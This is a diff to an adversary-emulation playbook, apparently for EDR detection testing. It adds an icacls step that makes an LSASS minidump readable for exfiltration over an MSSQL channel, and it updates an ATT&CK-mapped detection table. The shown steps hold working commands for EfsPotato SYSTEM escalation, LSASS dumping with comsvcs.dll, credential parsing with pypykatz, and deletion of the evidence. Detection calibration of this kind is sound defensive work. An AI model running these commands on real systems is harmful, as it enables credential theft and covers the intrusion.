@@ -163,8 +163,13 @@ LSASS PID. The dump itself needs no wrapper: `CertEnrollSvc.exe` spawns `rundll3
 
 Unlike Step 2's `RtlCreateProcessReflection` approach, this method opens a `PROCESS_ALL_ACCESS`
 handle to the real `lsass.exe` and writes a standard Windows minidump with intact MDMP magic bytes
-to `C:\ProgramData\g.dmp` - no fork, no XOR encryption, no filename masquerade. The artifact is
-parseable directly with `pypykatz` on arrival, skipping Step 4's decrypt pass. The trade-off is
+to `C:\ProgramData\g.dmp` - no fork, no XOR encryption, no filename masquerade. One quirk must be
+handled before collection: dbghelp creates `g.dmp` with an explicit `SYSTEM`/`Administrators`-only
+DACL (non-inherited - it does not pick up the `BUILTIN\Users:(RX)` ACE the parent directory grants),
+so the adversary resets the file's permissions with `icacls` under SYSTEM before the MSSQL service
+account - the process identity that actually opens files via `OPENROWSET(BULK)` - can read it back
+through the database channel. The artifact is parseable directly with `pypykatz` on arrival,
+skipping Step 4's decrypt pass. The trade-off is
 deliberate: this is the highest-signal LSASS dump chain on EDR surfaces (the exact pattern
 documented in LockBit, Conti, BlackBasta, and BlackSuit playbooks), useful for testing the
 `comsvcs.dll MiniDump` detection family when the low-signal reflection path is unavailable.
@@ -218,7 +223,23 @@ documented in LockBit, Conti, BlackBasta, and BlackSuit playbooks), useful for t
      0
      ```
 
-4. Verify the dump file exists with its size (~50–100 MB depending on LSASS working set):
+4. ☣️ Reset the dump file's DACL - dbghelp creates `g.dmp` with an explicit `SYSTEM`/`Administrators`-only DACL (non-inherited), which the MSSQL service account cannot read:
+
+   ```
+   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c icacls C:\ProgramData\g.dmp /grant Users:RX" lsarpc
+   ```
+
+   - `icacls /grant Users:RX` restores the baseline the parent `C:\ProgramData` grants (`BUILTIN\Users:(RX)`) - not broader than needed
+   - This is a second EfsPotato escalation (every `xprun CertEnrollSvc.exe` call captures a fresh SYSTEM token)
+
+   - ***Expected Output***
+     ```text
+     exit_code
+     -----------
+     0
+     ```
+
+5. Verify the dump file exists with its size (~50–100 MB depending on LSASS working set):
 
    ```
    xpfile ls C:\ProgramData
@@ -230,7 +251,7 @@ documented in LockBit, Conti, BlackBasta, and BlackSuit playbooks), useful for t
      g.dmp   <size>   <date>
      ```
 
-5. ☣️ Exfiltrate the dump via the MSSQL DB channel - same mechanism as Step 3, no XOR decode needed:
+6. ☣️ Exfiltrate the dump via the MSSQL DB channel - same mechanism as Step 3, no XOR decode needed:
 
    ```
    xpexfil-hex C:\ProgramData\g.dmp gdump.tmp 600 8
@@ -238,10 +259,10 @@ documented in LockBit, Conti, BlackBasta, and BlackSuit playbooks), useful for t
 
    > `g.dmp` is a plaintext MDMP dump - on the attacker machine it is parsed directly with `pypykatz lsa minidump gdump.tmp`; Step 4's XOR decrypt pass is skipped for this artifact.
 
-6. ☣️ Cleanup - delete the dump and the PID staging file from IIS01 (both SYSTEM-owned):
+7. ☣️ Cleanup - delete the dump and the staging files from IIS01 (all SYSTEM-owned):
 
    ```
-   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\g.dmp C:\ProgramData\pid_out.txt" lsarpc
+   xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\g.dmp C:\ProgramData\pid_out.txt C:\ProgramData\acl_out.txt" lsarpc
    ```
 
    - ***Expected Output***
@@ -260,7 +281,8 @@ documented in LockBit, Conti, BlackBasta, and BlackSuit playbooks), useful for t
 | CertEnrollSvc.exe EfsPotato SYSTEM escalation runs tasklist to resolve the live lsass.exe PID | Discovery | T1057 | Process Discovery | Windows | `cmd.exe` running as `NT AUTHORITY\SYSTEM` (child of `CertEnrollSvc.exe`) spawns `tasklist.exe` with command line containing `/fi "IMAGENAME eq lsass.exe"` and redirects CSV output to `C:\ProgramData\pid_out.txt` - Sysmon EC=1 with `tasklist.exe` as Image and SYSTEM as User; command line explicitly filters process enumeration to `lsass.exe`, the credential-dump target, immediately preceding a dump operation | Not Calibrated - Not Benign | native-recon | `CertEnrollSvc.exe` performs the EfsPotato escalation and spawns `cmd /c tasklist /fi "IMAGENAME eq lsass.exe" /fo csv /nh > C:\ProgramData\pid_out.txt 2>&1` as `NT AUTHORITY\SYSTEM` - resolves the live LSASS PID required by `comsvcs.dll MiniDump` | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 | OPENROWSET BULK reads tasklist output from C:\ProgramData\pid_out.txt on IIS01 | Collection | T1005 | Data from Local System | Windows | `sqlservr.exe` on IIS01 opens `C:\ProgramData\pid_out.txt` for read access via `OPENROWSET(BULK ... SINGLE_CLOB)` - EDR file-read telemetry: `sqlservr.exe` reading non-database `.txt` from `C:\ProgramData\` has no baseline on this IIS01 instance; native T-SQL operation, no COM automation or cmd.exe spawn | Calibrated - Not Benign | - | `xpfile cat C:\ProgramData\pid_out.txt` - `OPENROWSET(BULK ... SINGLE_CLOB)` reads the tasklist CSV in-process within `sqlservr.exe`; operator extracts the lsass.exe PID from the CSV row; same retrieval pattern as Phase 2 Step 4 `sys_out.txt` | IIS01 (10.12.10.20) | sa | [controlShell](../resources/payloads/rce-and-c2/mustang-panda-emulation/controlShell/) | - |
 | CertEnrollSvc.exe EfsPotato SYSTEM escalation proxies rundll32.exe comsvcs.dll MiniDump export | Defense Evasion | T1218.011 | System Binary Proxy Execution: Rundll32 | Windows | `rundll32.exe` spawned directly by `CertEnrollSvc.exe` (no `cmd.exe` parent) with command line containing `C:\Windows\System32\comsvcs.dll MiniDump` on IIS01 - Sysmon EC=1 with `rundll32.exe` (SYSTEM) as Image and `comsvcs.dll` in CommandLine; baseline: rundll32.exe does not load comsvcs.dll anywhere in a clean Windows Server build - its legitimate callouts are shell/tapi control-panel DLLs - and rundll32.exe as a direct child of a non-service binary running from `C:\ProgramData\` has no baseline | Calibrated - Not Benign | - | `xprun C:\ProgramData\CertEnrollSvc.exe "rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\ProgramData\g.dmp full" lsarpc` - `CreateProcessWithTokenW` spawns rundll32.exe directly as `NT AUTHORITY\SYSTEM` with no `cmd.exe` wrapper; rundll32 proxies `comsvcs.dll`'s `MiniDump` export - fallback when Step 2's `RtlCreateProcessReflection` fork is blocked or crashes mid-dump; exercises the `comsvcs.dll MiniDump` detection chain documented in Conti, BlackBasta, and BlackSuit playbooks | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
-| comsvcs.dll MiniDump writes plaintext LSASS minidump to C:\ProgramData\g.dmp | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `rundll32.exe` (NT AUTHORITY\SYSTEM) opens `lsass.exe` with `PROCESS_ALL_ACCESS` (GrantedAccess `0x1FFFFF` - Sysmon EC=10 on `lsass.exe` target) and writes a ~50–100 MB file with intact MDMP magic (`4D 44 4D 50` at offset 0) to `C:\ProgramData\g.dmp` (Sysmon EC=11) - the `0x1FFFFF` handle-open on the live `lsass.exe` and the plaintext MDMP file write are distinct from Step 2's `0x4FA` reflection fork and MDMP-stripped XOR-encrypted `DFxxxx.tmp` output; Sysmon EC=10 on lsass.exe with `0x1FFFFF` is the most widely implemented LSASS dump detection signature | Calibrated - Not Benign | - | `comsvcs.dll MiniDump <lsass_pid> C:\ProgramData\g.dmp full` dumps the live LSASS working set via rundll32.exe - unlike Step 2's XOR-encrypted MDMP-stripped dump, `g.dmp` carries plaintext credential structures parseable directly by `pypykatz`/`mimikatz` without offline decryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
+| comsvcs.dll MiniDump writes plaintext LSASS minidump to C:\ProgramData\g.dmp | Credential Access | T1003.001 | OS Credential Dumping: LSASS Memory | Windows | `rundll32.exe` (NT AUTHORITY\SYSTEM) opens `lsass.exe` with `PROCESS_ALL_ACCESS` (GrantedAccess `0x1FFFFF` - Sysmon EC=10 on `lsass.exe` target) and writes a ~50–100 MB file with intact MDMP magic (`4D 44 4D 50` at offset 0) to `C:\ProgramData\g.dmp` (Sysmon EC=11) - the `0x1FFFFF` handle-open on the live `lsass.exe` and the plaintext MDMP file write are distinct from Step 2's `0x4FA` reflection fork and MDMP-stripped XOR-encrypted `DFxxxx.tmp` output; Sysmon EC=10 on lsass.exe with `0x1FFFFF` is the most widely implemented LSASS dump detection signature; the written file carries an explicit non-inherited `SYSTEM`/`Administrators`-only DACL (dbghelp behavior - it does not inherit the parent directory's `BUILTIN\Users:(RX)` ACE) | Calibrated - Not Benign | - | `comsvcs.dll MiniDump <lsass_pid> C:\ProgramData\g.dmp full` dumps the live LSASS working set via rundll32.exe - unlike Step 2's XOR-encrypted MDMP-stripped dump, `g.dmp` carries plaintext credential structures parseable directly by `pypykatz`/`mimikatz` without offline decryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
+| CertEnrollSvc.exe EfsPotato SYSTEM escalation grants BUILTIN\Users read access to g.dmp via icacls | Defense Evasion | T1222.001 | File and Directory Permissions Modification: Windows File and Directory Permissions Modification | Windows | `cmd.exe` running as `NT AUTHORITY\SYSTEM` (child of `CertEnrollSvc.exe`) spawns `icacls.exe` with command line containing `/grant Users:RX` targeting `C:\ProgramData\g.dmp` - Sysmon EC=1 with `icacls.exe` as Image; baseline: DACL modification of a ~50–100 MB SYSTEM-owned dump file in `C:\ProgramData\` from a sp_OA-launched SYSTEM chain has no legitimate use on this IIS01 instance; the filesystem corollary is a `Users:(RX)` ACE appearing on a file whose owner is `NT AUTHORITY\SYSTEM` with a non-inherited DACL | Calibrated - Not Benign | - | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c icacls C:\ProgramData\g.dmp /grant Users:RX" lsarpc` - dbghelp writes the minidump with an explicit SY/BA-only DACL that blocks the MSSQL service account (the identity that opens files via `OPENROWSET(BULK)`) from reading it back; `icacls /grant Users:RX` restores the parent-directory baseline (`BUILTIN\Users:(RX)`) so the database-channel exfil can read the file - second EfsPotato escalation in the fallback chain | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 | CertEnrollSvc.exe EfsPotato SYSTEM escalation deletes g.dmp dump file and pid_out.txt from IIS01 | Stealth | T1070.004 | Indicator Removal: File Deletion | Windows | `CertEnrollSvc.exe` (spawned by `sqlservr.exe` via sp_OA) performs a second EfsPotato escalation, then `cmd.exe /c del /f C:\ProgramData\g.dmp C:\ProgramData\pid_out.txt` as `NT AUTHORITY\SYSTEM` - Sysmon EC=23/26 with `cmd.exe` (SYSTEM) as Image; `xpfile del` (sp_OA FSO) fails with `0x800A0046` on SYSTEM-owned files | Not Calibrated - Not Benign | staging | `xprun C:\ProgramData\CertEnrollSvc.exe "cmd /c del /f C:\ProgramData\g.dmp C:\ProgramData\pid_out.txt" lsarpc` - second EfsPotato escalation required because both files are owned by SYSTEM; same escalation chain as T1134.001/T1134.002 | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [CertEnrollSvc.exe](../resources/payloads/priv-escalation/EfsPotato/) | - |
 
 ---
